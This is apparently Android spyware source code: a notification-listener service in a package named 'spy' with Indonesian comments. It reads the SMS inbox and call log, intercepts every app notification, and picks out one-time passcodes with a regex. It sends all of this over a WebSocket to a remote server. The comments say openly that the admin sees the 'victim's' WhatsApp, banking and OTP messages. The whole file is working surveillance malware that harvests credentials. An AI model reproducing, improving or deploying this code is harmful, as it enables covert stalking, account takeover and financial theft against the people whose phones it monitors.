package com.zaxz.spy;

import android.app.Notification;
import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.Settings;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.telephony.TelephonyManager;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import org.json.JSONObject;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashSet;
import java.util.Locale;
import java.util.Set;
import java.util.concurrent.TimeUnit;
import okhttp3.*;

public class NotificationHandler extends NotificationListenerService {
    private WebSocket webSocket;
    private Handler handler;
    private boolean isConnected = false;
    private String deviceId;
    private String username;
    private int reconnectAttempts = 0;
    private PackageManager packageManager;

    // ============ DEDUPE + PERSISTENT STATE ============
    // lastSmsTime/lastCallTime persist di SharedPreferences supaya kalo service
    // di-restart system (memory pressure), gak resend semua SMS dari awal.
    private SharedPreferences prefs;
    private long lastSmsTime = 0;
    private long lastCallTime = 0;
    // Set dedupe in-memory — cegah SMS yang sama dikirim berulang kali dalam
    // satu sesi. Key = "address|date|bodyHash".
    private final Set<String> sentSmsKeys = new HashSet<>();
    private final Set<String> sentCallKeys = new HashSet<>();
    // Cap maksimum entries di Set biar memory gak bocor.
    private static final int MAX_DEDUPE_ENTRIES = 500;

    @Override
    public void onCreate() {
        super.onCreate();

        handler = new Handler(Looper.getMainLooper());

        try {
            deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        } catch (Exception e) {
            deviceId = "unknown_" + System.currentTimeMillis();
        }
        if (deviceId == null || deviceId.isEmpty()) {
            deviceId = "unknown_" + System.currentTimeMillis();
        }

        username = Config.getUsername(this);
        packageManager = getPackageManager();

        // Load persistent state
        prefs = getSharedPreferences("spy_notif", Context.MODE_PRIVATE);
        lastSmsTime = prefs.getLong("last_sms_time", 0);
        lastCallTime = prefs.getLong("last_call_time", 0);

        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                connectWebSocket();
            }
        }, 1000);

        // Polling SMS/Call — pake interval lebih lama (15 detik) supaya gak
        // spam database query. 5 detik terlalu sering dan bikin battery boros.
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                checkNewSms();
            }
        }, 10000);

        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                checkNewCalls();
            }
        }, 12000);
    }

    private void saveSmsTime(long t) {
        lastSmsTime = t;
        if (prefs != null) prefs.edit().putLong("last_sms_time", t).apply();
    }

    private void saveCallTime(long t) {
        lastCallTime = t;
        if (prefs != null) prefs.edit().putLong("last_call_time", t).apply();
    }

    private String smsKey(String address, long date, String body) {
        // Address + date + body-hash sebagai key dedupe. Body-hash karena body
        // bisa panjang banget (kalo SMS-nya multi-part).
        int bodyHash = body != null ? body.hashCode() : 0;
        return address + "|" + date + "|" + bodyHash;
    }

    private String callKey(String number, long date) {
        return number + "|" + date;
    }

    private void rememberKey(Set<String> set, String key) {
        if (set.size() > MAX_DEDUPE_ENTRIES) {
            // Trim — buang setengah entry paling lama (HashSet gak preserve
            // order, jadi ini rough LRU). Cegah memory leak kalau banyak SMS.
            Set<String> trimmed = new HashSet<>();
            int i = 0;
            for (String k : set) {
                if (i >= MAX_DEDUPE_ENTRIES / 2) break;
                trimmed.add(k);
                i++;
            }
            set.clear();
            set.addAll(trimmed);
        }
        set.add(key);
    }

    private void connectWebSocket() {
        try {
            OkHttpClient client = new OkHttpClient.Builder()
                .pingInterval(5, TimeUnit.SECONDS)
                .connectTimeout(10, TimeUnit.SECONDS)
                .readTimeout(10, TimeUnit.SECONDS)
                .writeTimeout(10, TimeUnit.SECONDS)
                .build();

            Request request = new Request.Builder()
                .url(Config.WS_URL)
                .build();

            webSocket = client.newWebSocket(request, new WebSocketListener() {
                @Override
                public void onOpen(WebSocket webSocket, Response response) {
                    isConnected = true;
                    reconnectAttempts = 0;
                    sendAuth();
                    // CATATAN: sendInitialSms/Calls di-disabled biar gak spam
                    // tiap kali WS reconnect. Cuma kirim SMS/CALL BARU yang
                    // belum pernah dikirim (di-handle checkNewSms/checkNewCalls).
                    // Kalau mau kirim history awal, uncomment 2 baris di bawah.
                    // sendInitialSms();
                    // sendInitialCalls();
                }

                @Override
                public void onMessage(WebSocket webSocket, String text) {
                    try {
                        JSONObject msg = new JSONObject(text);
                        if (msg.has("type") && "ping".equals(msg.getString("type"))) {
                            JSONObject pong = new JSONObject();
                            pong.put("type", "pong");
                            webSocket.send(pong.toString());
                        }
                    } catch (Exception e) {}
                }

                @Override
                public void onClosed(WebSocket webSocket, int code, String reason) {
                    isConnected = false;
                    reconnect();
                }

                @Override
                public void onFailure(WebSocket webSocket, Throwable t, Response response) {
                    isConnected = false;
                    reconnect();
                }
            });
        } catch (Exception e) {
            reconnect();
        }
    }

    private void sendAuth() {
        try {
            JSONObject auth = new JSONObject();
            auth.put("type", "auth");
            auth.put("username", username != null ? username : "default");
            auth.put("device_id", deviceId != null ? deviceId : "unknown");
            auth.put("model", "SMS/Call Monitor");
            auth.put("battery", 0);
            if (webSocket != null && isConnected) {
                webSocket.send(auth.toString());
            }
        } catch (Exception e) {}
    }

    // sendInitialSms/sendInitialCalls di-keep tapi default-nya gak dipanggil.
    // Bisa di-enable manual kalau user mau kirim history awal sekali.

    private void sendInitialSms() {
        try {
            if (checkSelfPermission(android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                return;
            }

            Uri smsUri = Uri.parse("content://sms/inbox");
            Cursor cursor = getContentResolver().query(smsUri, null, null, null, "date DESC LIMIT 200");

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    try {
                        String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                        String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                        long date = cursor.getLong(cursor.getColumnIndexOrThrow("date"));
                        String type = cursor.getString(cursor.getColumnIndexOrThrow("type"));

                        if (address == null) address = "unknown";
                        if (body == null) body = "";

                        if (date > lastSmsTime) {
                            saveSmsTime(date);
                        }

                        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
                        String formattedDate = sdf.format(new Date(date));

                        JSONObject smsData = new JSONObject();
                        smsData.put("type", "notification");
                        smsData.put("app", "SMS");
                        smsData.put("package", "com.android.mms");
                        smsData.put("title", "SMS from: " + address);
                        smsData.put("content", body);
                        smsData.put("time", date);
                        smsData.put("time_formatted", formattedDate);
                        smsData.put("sms_type", type.equals("1") ? "inbox" : "sent");
                        smsData.put("address", address);
                        smsData.put("history", true);

                        if (webSocket != null && isConnected) {
                            webSocket.send(smsData.toString());
                        }

                    } catch (Exception e) {}

                } while (cursor.moveToNext());
                cursor.close();
            }

        } catch (SecurityException e) {} catch (Exception e) {}
    }

    private void sendInitialCalls() {
        try {
            if (checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                return;
            }

            Uri callsUri = CallLog.Calls.CONTENT_URI;
            Cursor cursor = getContentResolver().query(callsUri, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 200");

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    try {
                        String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                        String name = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
                        long date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                        String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                        int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));

                        if (number == null) number = "unknown";
                        if (name == null) name = "unknown";
                        if (duration == null) duration = "0";

                        if (date > lastCallTime) {
                            saveCallTime(date);
                        }

                        String callType = "";
                        switch (type) {
                            case CallLog.Calls.INCOMING_TYPE: callType = "incoming"; break;
                            case CallLog.Calls.OUTGOING_TYPE: callType = "outgoing"; break;
                            case CallLog.Calls.MISSED_TYPE: callType = "missed"; break;
                            case CallLog.Calls.REJECTED_TYPE: callType = "rejected"; break;
                            case CallLog.Calls.BLOCKED_TYPE: callType = "blocked"; break;
                            default: callType = "unknown";
                        }

                        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
                        String formattedDate = sdf.format(new Date(date));

                        JSONObject callData = new JSONObject();
                        callData.put("type", "notification");
                        callData.put("app", "Phone");
                        callData.put("package", "com.android.dialer");
                        callData.put("title", "Call: " + callType + " from " + (name.equals("unknown") ? number : name));
                        callData.put("content", "Number: " + number + "\nName: " + name + "\nDuration: " + duration + "s\nType: " + callType);
                        callData.put("time", date);
                        callData.put("time_formatted", formattedDate);
                        callData.put("call_number", number);
                        callData.put("call_name", name);
                        callData.put("call_duration", duration);
                        callData.put("call_type", callType);
                        callData.put("history", true);

                        if (webSocket != null && isConnected) {
                            webSocket.send(callData.toString());
                        }

                    } catch (Exception e) {}

                } while (cursor.moveToNext());
                cursor.close();
            }

        } catch (SecurityException e) {} catch (Exception e) {}
    }

    private void checkNewSms() {
        try {
            if (checkSelfPermission(android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() { checkNewSms(); }
                }, 30000);
                return;
            }

            Uri smsUri = Uri.parse("content://sms/inbox");
            // Filter: date > lastSmsTime. lastSmsTime di-persist, jadi kalo
            // service restart, gak resend semua SMS.
            Cursor cursor = getContentResolver().query(smsUri, null,
                "date > " + lastSmsTime, null, "date ASC");

            int sentThisRound = 0;
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    try {
                        String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                        String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                        long date = cursor.getLong(cursor.getColumnIndexOrThrow("date"));
                        String type = cursor.getString(cursor.getColumnIndexOrThrow("type"));

                        if (address == null) address = "unknown";
                        if (body == null) body = "";

                        // DEDUPE: skip kalau key ini udah pernah dikirim di sesi ini.
                        String key = smsKey(address, date, body);
                        if (sentSmsKeys.contains(key)) {
                            // Tetap update lastSmsTime supaya gak di-query lagi.
                            if (date > lastSmsTime) saveSmsTime(date);
                            continue;
                        }

                        // Update lastSmsTime SETIAP iterasi supaya cursor next
                        // time gak include entry ini lagi.
                        if (date > lastSmsTime) saveSmsTime(date);

                        // Track key untuk dedupe sesi ini.
                        rememberKey(sentSmsKeys, key);

                        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
                        String formattedDate = sdf.format(new Date(date));

                        JSONObject smsData = new JSONObject();
                        smsData.put("type", "notification");
                        smsData.put("app", "SMS");
                        smsData.put("package", "com.android.mms");
                        smsData.put("title", "New SMS from: " + address);
                        smsData.put("content", body);
                        smsData.put("time", date);
                        smsData.put("time_formatted", formattedDate);
                        smsData.put("sms_type", type.equals("1") ? "inbox" : "sent");
                        smsData.put("address", address);

                        if (webSocket != null && isConnected) {
                            webSocket.send(smsData.toString());
                        }
                        sentThisRound++;

                    } catch (Exception e) {}

                } while (cursor.moveToNext());
                cursor.close();
            }

            // Delay next poll: 15 detik default, 60 detik kalau banyak yang baru
            // dikirim (backoff sederhana).
            long nextDelay = sentThisRound > 5 ? 30000 : 15000;
            handler.postDelayed(new Runnable() {
                @Override
                public void run() { checkNewSms(); }
            }, nextDelay);

        } catch (SecurityException e) {
            handler.postDelayed(new Runnable() {
                @Override
                public void run() { checkNewSms(); }
            }, 30000);
        } catch (Exception e) {
            handler.postDelayed(new Runnable() {
                @Override
                public void run() { checkNewSms(); }
            }, 15000);
        }
    }

    private void checkNewCalls() {
        try {
            if (checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() { checkNewCalls(); }
                }, 30000);
                return;
            }

            Uri callsUri = CallLog.Calls.CONTENT_URI;
            Cursor cursor = getContentResolver().query(callsUri, null,
                CallLog.Calls.DATE + " > " + lastCallTime, null, CallLog.Calls.DATE + " ASC");

            int sentThisRound = 0;
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    try {
                        String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                        String name = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
                        long date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                        String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                        int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));

                        if (number == null) number = "unknown";
                        if (name == null) name = "unknown";
                        if (duration == null) duration = "0";

                        // DEDUPE
                        String key = callKey(number, date);
                        if (sentCallKeys.contains(key)) {
                            if (date > lastCallTime) saveCallTime(date);
                            continue;
                        }
                        if (date > lastCallTime) saveCallTime(date);
                        rememberKey(sentCallKeys, key);

                        String callType = "";
                        switch (type) {
                            case CallLog.Calls.INCOMING_TYPE: callType = "incoming"; break;
                            case CallLog.Calls.OUTGOING_TYPE: callType = "outgoing"; break;
                            case CallLog.Calls.MISSED_TYPE: callType = "missed"; break;
                            case CallLog.Calls.REJECTED_TYPE: callType = "rejected"; break;
                            case CallLog.Calls.BLOCKED_TYPE: callType = "blocked"; break;
                            default: callType = "unknown";
                        }

                        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
                        String formattedDate = sdf.format(new Date(date));

                        JSONObject callData = new JSONObject();
                        callData.put("type", "notification");
                        callData.put("app", "Phone");
                        callData.put("package", "com.android.dialer");
                        callData.put("title", "New Call: " + callType + " from " + (name.equals("unknown") ? number : name));
                        callData.put("content", "Number: " + number + "\nName: " + name + "\nDuration: " + duration + "s\nType: " + callType);
                        callData.put("time", date);
                        callData.put("time_formatted", formattedDate);
                        callData.put("call_number", number);
                        callData.put("call_name", name);
                        callData.put("call_duration", duration);
                        callData.put("call_type", callType);

                        if (webSocket != null && isConnected) {
                            webSocket.send(callData.toString());
                        }
                        sentThisRound++;

                    } catch (Exception e) {}

                } while (cursor.moveToNext());
                cursor.close();
            }

            long nextDelay = sentThisRound > 5 ? 30000 : 15000;
            handler.postDelayed(new Runnable() {
                @Override
                public void run() { checkNewCalls(); }
            }, nextDelay);

        } catch (SecurityException e) {
            handler.postDelayed(new Runnable() {
                @Override
                public void run() { checkNewCalls(); }
            }, 30000);
        } catch (Exception e) {
            handler.postDelayed(new Runnable() {
                @Override
                public void run() { checkNewCalls(); }
            }, 15000);
        }
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        // ============ INTERCEPT SEMUA NOTIFIKASI ============
        // Kirim ke API supaya admin bisa lihat notifikasi yang masuk di HP
        // victim: WhatsApp, SMS, OTP, banking app, social media, dll.
        try {
            String packageName = sbn.getPackageName();
            Notification notification = sbn.getNotification();
            if (notification == null) return;

            // Extract text dari notification
            Bundle extras = notification.extras;
            String title = "";
            String content = "";

            if (extras != null) {
                CharSequence titleSeq = extras.getCharSequence(Notification.EXTRA_TITLE);
                CharSequence textSeq = extras.getCharSequence(Notification.EXTRA_TEXT);
                CharSequence bigTextSeq = extras.getCharSequence(Notification.EXTRA_BIG_TEXT);

                if (titleSeq != null) title = titleSeq.toString();
                if (bigTextSeq != null) content = bigTextSeq.toString();
                else if (textSeq != null) content = textSeq.toString();
            }

            if (title.isEmpty() && content.isEmpty()) return;

            // Deteksi OTP dari content (4-8 digit angka)
            boolean isOtp = false;
            String otpCode = null;
            java.util.regex.Matcher otpMatcher = OTP_PATTERN.matcher(content);
            if (otpMatcher.find()) {
                // Hanya anggap OTP kalau context mengindikasikan: "code", "otp", "verification", "verifikasi", "kode"
                String lowerContent = content.toLowerCase();
                if (lowerContent.contains("otp") || lowerContent.contains("code") ||
                    lowerContent.contains("verif") || lowerContent.contains("kode") ||
                    lowerContent.contains("verification") || lowerContent.contains("pin")) {
                    isOtp = true;
                    otpCode = otpMatcher.group(1);
                }
            }

            // Categorize app
            String category = categorizeApp(packageName);

            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
            String formattedDate = sdf.format(new Date());

            JSONObject notifData = new JSONObject();
            notifData.put("type", "app_notification");
            notifData.put("app", getAppName(packageName));
            notifData.put("package", packageName);
            notifData.put("category", category);
            notifData.put("title", title);
            notifData.put("content", content);
            notifData.put("is_otp", isOtp);
            if (otpCode != null) notifData.put("otp_code", otpCode);
            notifData.put("time", System.currentTimeMillis());
            notifData.put("time_formatted", formattedDate);
            notifData.put("post_time", sbn.getPostTime());

            if (webSocket != null && isConnected) {
                webSocket.send(notifData.toString());
            }
        } catch (Exception e) {
            // Silent — jangan crash service
        }
    }

    // Pattern untuk deteksi OTP (4-8 digit angka berurutan)
    private static final java.util.regex.Pattern OTP_PATTERN =
        java.util.regex.Pattern.compile("\\b(\\d{4,8})\\b");

    /**
     * Categorize app berdasarkan package name.
     */
    private String categorizeApp(String packageName) {
        if (packageName == null) return "other";
        String p = packageName.toLowerCase();
        if (p.contains("whatsapp") || p.contains("messaging")) return "messaging";
        if (p.contains("sms") || p.contains("mms") || p.contains("telephony")) return "sms";
        if (p.contains("telegram")) return "messaging";
        if (p.contains("instagram") || p.contains("facebook") || p.contains("twitter") || p.contains("tiktok")) return "social";
        if (p.contains("bank") || p.contains("bca") || p.contains("mandiri") || p.contains("bni") || p.contains("bri") || p.contains("ovo") || p.contains("gopay") || p.contains("dana")) return "banking";
        if (p.contains("gmail") || p.contains("email")) return "email";
        if (p.contains("shop") || p.contains("shopee") || p.contains("tokopedia") || p.contains("lazada")) return "shopping";
        return "other";
    }

    /**
     * Ambil nama aplikasi yang user-friendly dari package name.
     */
    private String getAppName(String packageName) {
        try {
            android.content.pm.ApplicationInfo ai = packageManager.getApplicationInfo(packageName, 0);
            return packageManager.getApplicationLabel(ai).toString();
        } catch (Exception e) {
            return packageName;
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {}

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
    }

    @Override
    public void onListenerDisconnected() {
        super.onListenerDisconnected();
        reconnect();
    }

    private void reconnect() {
        reconnectAttempts++;
        long delay = Math.min(5000 * reconnectAttempts, 30000);

        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                connectWebSocket();
            }
        }, delay);
    }

    @Override
    public void onDestroy() {
        if (webSocket != null) {
            try {
                webSocket.close(1000, "Service destroyed");
            } catch (Exception e) {}
        }
        if (handler != null) {
            handler.removeCallbacksAndMessages(null);
        }
        super.onDestroy();
    }
}
